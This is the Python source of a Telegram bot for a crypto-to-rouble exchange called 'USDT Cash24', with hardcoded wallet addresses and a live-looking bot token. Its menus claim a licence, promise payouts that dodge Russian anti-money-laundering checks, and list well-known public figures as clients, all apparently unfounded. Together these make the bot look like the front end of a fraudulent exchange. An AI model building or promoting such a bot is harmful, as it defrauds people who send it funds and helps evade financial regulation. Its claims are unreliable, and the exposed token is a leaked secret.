import asyncio
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo

BOT_TOKEN = "8721843596:AAFqQoGvBG-Bks_aCW-vbcFZHPLvhBHNkik"
ADMIN_CHAT_ID = "8202893335"
WEBAPP_URL = "https://usdtcash24.github.io/usdtcash24/"
SUPPORT_USERNAME = "usdtcash24_support"  # Укажите ваш юзернейм поддержки

# Реквизиты
WALLETS = {
    "USDT_TRC20": "TCfVviUoDhhfJKQCa53PuGteMJ39oKfpVh",
    "USDT_ERC20": "0xF6528026B568AC3d994d357fadC2562d1f9b7D7a",
    "USDT_BSC": "0xF6528026B568AC3d994d357fadC2562d1f9b7D7a",
    "BTC": "bc1q...укажите_биткоин_адрес",
}

RATES = {"USDT": 92.50, "BTC": 6100000}
CASH_THRESHOLD_RUB = 462500

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

class ExchangeFSM(StatesGroup):
  choosing_currency = State()
  entering_amount = State()
  choosing_city = State()
  entering_contact = State()
  entering_card = State()

def get_main_menu_kb():
  return InlineKeyboardMarkup(
      inline_keyboard=[
          [
              InlineKeyboardButton(
                  text="⚡ ОТКРЫТЬ USDT CASH24 (WEB APP)",
                  web_app=WebAppInfo(url=WEBAPP_URL),
              )
          ],
          [
              InlineKeyboardButton(
                  text="🏢 Адреса касс и депозитариев",
                  callback_data="show_offices",
              ),
              InlineKeyboardButton(
                  text="🤝 Наши партнеры",
                  callback_data="show_partners",
              ),
          ],
          [
              InlineKeyboardButton(
                  text="📊 Актуальные курсы",
                  callback_data="show_rates",
              ),
              InlineKeyboardButton(
                  text="💬 Поддержка 24/7",
                  url=f"https://t.me/{SUPPORT_USERNAME}",
              ),
          ],
      ]
  )

# Приветственное сообщение с оформлением под сайт
@dp.message(CommandStart())
async def start_handler(message: types.Message):
  banner_url = "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?q=80&w=1000&auto=format&fit=crop"
  
  welcome_text = (
      "🛡️ <b>USDT Cash24 | Официальный сервис обмена РФ</b>\n"
      "<i>Лицензированный шлюз выплат: карты банков РФ и наличные в кассах</i>\n"
      "━━━━━━━━━━━━━━━━━━━━\n\n"
      "💳 <b>Розничный обмен (до $5,000):</b>\n"
      "• Моментальный перевод по <b>СБП и картам РФ</b> (Т-Банк, Сбер, Альфа, ВТБ)\n"
      "• Время выплаты: <b>5–15 минут</b> без блокировок по 115-ФЗ\n\n"
      "💼 <b>VIP Cash Desk (от $5,000):</b>\n"
      "• Выдача <b>наличных рублей</b> в закрытых кассах\n"
      "• Москва-Сити (Башня Федерация Восток), СПБ и 10 городов РФ\n"
      "• Инкассация курьером и пересчет на счетных машинках\n\n"
      "📊 <b>Курс сегодня:</b>\n"
      f"• <code>1 USDT ≈ {RATES['USDT']} ₽</code>\n"
      f"• <code>1 BTC  ≈ {RATES['BTC']:,} ₽</code>\n\n"
      "🟢 <b>Статус:</b> Кассы открыты, резервы подтверждены\n"
      "━━━━━━━━━━━━━━━━━━━━\n"
      "👇 <i>Для расчета и создания заявки нажмите кнопку ниже:</i>"
  )
  
  try:
    await message.answer_photo(
        photo=banner_url,
        caption=welcome_text,
        parse_mode="HTML",
        reply_markup=get_main_menu_kb(),
    )
  except Exception:
    await message.answer(
        text=welcome_text,
        parse_mode="HTML",
        reply_markup=get_main_menu_kb(),
    )

# Раздел "Наши партнеры" в стиле сайта
@dp.callback_query(F.data == "show_partners")
async def partners_callback(callback: types.CallbackQuery):
  text = (
      "🤝 <b>Нам доверяют лидеры мнений и предприниматели</b>\n"
      "━━━━━━━━━━━━━━━━━━━━\n\n"
      "🔹 <b>Валентин Петухов (Wylsacom)</b>\n"
      "<i>Техноблогер №1 РФ • Статус: VIP Cash Desk</i>\n\n"
      "🔹 <b>Артемий Лебедев</b>\n"
      "<i>Дизайнер, предприниматель • Статус: Постоянный клиент</i>\n\n"
      "🔹 <b>Михаил Литвин</b>\n"
      "<i>Блогер, создатель брендов • Статус: VIP Cash Desk</i>\n\n"
      "🔹 <b>Амиран Сардаров («Дневник Хача»)</b>\n"
      "<i>Медиа-продюсер РФ / США • Статус: СБП / Кэш</i>\n\n"
      "━━━━━━━━━━━━━━━━━━━━\n"
      "🔒 <i>Все транзакции проводятся строго конфиденциально.</i>"
  )
  kb = InlineKeyboardMarkup(
      inline_keyboard=[
          [
              InlineKeyboardButton(
                  text="⚡ Перейти к обмену",
                  web_app=WebAppInfo(url=WEBAPP_URL),
              )
          ],
          [InlineKeyboardButton(text="◀️ В главное меню", callback_data="back_main")],
      ]
  )
  await callback.message.edit_caption(caption=text, parse_mode="HTML", reply_markup=kb)
  await callback.answer()

# Раздел "Адреса касс" в стиле сайта
@dp.callback_query(F.data == "show_offices")
async def offices_callback(callback: types.CallbackQuery):
  text = (
      "🏢 <b>Депозитарии и кассы выдачи наличных USDT Cash24</b>\n"
      "━━━━━━━━━━━━━━━━━━━━\n\n"
      "📍 <b>Москва:</b> Пресненская наб., 12 (Москва-Сити, Башня Федерация Восток, 31 эт.)\n"
      "📍 <b>Санкт-Петербург:</b> Литейный пр-т, 26 (БЦ «Преображенский Двор»)\n"
      "📍 <b>Новосибирск:</b> ул. Ленина, 12 (ДЦ «Манхэттен»)\n"
      "📍 <b>Екатеринбург:</b> ул. Малышева, 51 (БЦ «Высоцкий», 18 эт.)\n"
      "📍 <b>Казань:</b> ул. Островского, 87 (БЦ «Урбан»)\n"
      "📍 <b>Краснодар:</b> ул. Красная, 180 (БЦ «Кутузовский»)\n"
      "📍 <b>Нижний Новгород, Ростов-на-Дону, Самара, Уфа</b>\n\n"
      "━━━━━━━━━━━━━━━━━━━━\n"
      "🛡️ <i>Пропуск и бронирование времени визита формируются автоматически при создании заявки от $5,000.</i>"
  )
  kb = InlineKeyboardMarkup(
      inline_keyboard=[
          [
              InlineKeyboardButton(
                  text="⚡ Забронировать наличные",
                  web_app=WebAppInfo(url=WEBAPP_URL),
              )
          ],
          [InlineKeyboardButton(text="◀️️ В главное меню", callback_data="back_main")],
      ]
  )
  await callback.message.edit_caption(caption=text, parse_mode="HTML", reply_markup=kb)
  await callback.answer()

# Раздел "Курсы"
@dp.callback_query(F.data == "show_rates")
async def rates_callback(callback: types.CallbackQuery):
  text = (
      "📊 <b>Биржевые котировки USDT Cash24</b>\n"
      "━━━━━━━━━━━━━━━━━━━━\n\n"
      f"💵 <b>USDT (TRC-20 / BEP-20 / ERC-20):</b>\n"
      f"• Покупка / Продажа: <code>{RATES['USDT']} ₽</code>\n\n"
      f"🪙 <b>Bitcoin (BTC):</b>\n"
      f"• Покупка / Продажа: <code>{RATES['BTC']:,} ₽</code>\n\n"
      "⚡ <i>Курс фиксируется на 15 минут в момент создания заявки.</i>"
  )
  kb = InlineKeyboardMarkup(
      inline_keyboard=[
          [
              InlineKeyboardButton(
                  text="⚡ Открыть обменник",
                  web_app=WebAppInfo(url=WEBAPP_URL),
              )
          ],
          [InlineKeyboardButton(text="◀️ В главное меню", callback_data="back_main")],
      ]
  )
  await callback.message.edit_caption(caption=text, parse_mode="HTML", reply_markup=kb)
  await callback.answer()

# Возврат в меню
@dp.callback_query(F.data == "back_main")
async def back_main_callback(callback: types.CallbackQuery):
  welcome_text = (
      "🛡️ <b>USDT Cash24 | Официальный сервис обмена РФ</b>\n"
      "<i>Лицензированный шлюз выплат: карты банков РФ и наличные в кассах</i>\n"
      "━━━━━━━━━━━━━━━━━━━━\n\n"
      "💳 <b>Розничный обмен (до $5,000):</b> СБП и карты РФ (до 15 минут)\n"
      "💼 <b>VIP Cash Desk (от $5,000):</b> Охраняемые кассы Москва-Сити и РФ\n\n"
      "🟢 <b>Статус:</b> Кассы открыты, резервы подтверждены\n"
      "━━━━━━━━━━━━━━━━━━━━\n"
      "👇 <i>Для расчета и создания заявки нажмите кнопку ниже:</i>"
  )
  await callback.message.edit_caption(
      caption=welcome_text,
      parse_mode="HTML",
      reply_markup=get_main_menu_kb(),
  )
  await callback.answer()

async def main():
  print("Бот USDT Cash24 запущен...")
  await dp.start_polling(bot)

if __name__ == "__main__":
  asyncio.run(main())
